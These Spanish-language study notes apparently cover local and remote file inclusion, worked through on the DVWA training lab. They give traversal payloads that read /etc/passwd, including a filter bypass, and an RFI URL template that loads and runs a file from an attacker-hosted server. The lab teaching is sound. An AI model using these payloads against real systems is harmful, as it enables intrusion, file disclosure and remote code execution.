
---

### ¿Qué es?

Es una vulnerabilidad que ocurre cuando una aplicación web que permite a un usuario controlar que archivos se ejecutan y se cargan en el servidor.

Suele estar relacionado con una validación escasa en los parámetros de entrada.

---

### Tipos

#### LFI (Local File Inclusion)

El atacante logra que la aplicación cargue archivos que ya residen **localmente** en el servidor.
##### Ejemplos de DVWA:

**Nivel Bajo**:

El código vulnerable esta relacionado directamente con `$_GET['page']` dentro de la función `include()`.

![[Pasted image 20260131102145.png]]

Para explotar la vulnerabilidad pondremos en la url lo siguiente `?page=../../../etc/passwd` este es un mero ejemplo se puede dar el caso que se pueda navegar por otras carpetas y otras rutas.

**Nivel Medio**:

En esta dificultad el código elimina patrones para el enrutamiento de ficheros:

![[Pasted image 20260131102501.png]]

Para saltarnos la seguridad escribiremos lo mismo que en el ejemplo del **Nivel Bajo** pero de otra forma ya que el sistema de ficheros y resuelve las rutas de forma inteligente.

El payload sería el siguiente: `....//` en vez de `../` ya que el servidor lo interpreta de la misma forma.

Resultado final:

`?page=....//....//....//etc/passwd`

Para securizar este sistema de **lista negra** podríamos sustituir ese sistema por una de **lista blanca** permitiendo solo ciertos valores en vez de intentar descartar todas las formas de ataque.

Mentalidad correcta:

*"¿Qué debo prohibir? Por, ¿Qué es lo único que debo permitir?"*

**Nivel Alto**:

En este caso se abandonan las listas negras y se sustituyen por listas blancas.

![[Pasted image 20260131103956.png]]

Ahora se permite ficheros que empiecen por `file` y acaben en `.php` específicos para os fichero en la URL. 

El payload será por ende `?page=file:///etc/passwd`

#### RFI (Remote File Inclusion)

Es una vulnerabilidad que permite a un atacante forzar a una aplicación web a incluir y ejecutar un archivo en un servidor externo.

No se consigue de forma normal ya que tiene que estar configurado el `php.ini` de forma insegura.

```
allow_url_fopen = On # Permite que las funciones de archivos PHP accedan a objetos a través de URLs

allow_url_include = On #Permite que las directivas include() y require() utilicen URLs remotas.
```

Para estos casos tendremos que tener desplegado un servidor web ya sea con **Python** o con **Apache**

Python:

```
python3 -m http.server 8000
```

Apache:

```
systemctl start apache2
```

En la URL de la maquina víctima incluiremos los payloads de la siguiente forma:

```
http://[IP máquina víctima y rutas]/?page=http://[IP máquina atacante]:[puerto]/[archivo]
```

El archivo puede ser un un ejecutable, un `.php` o un archivo de texto.

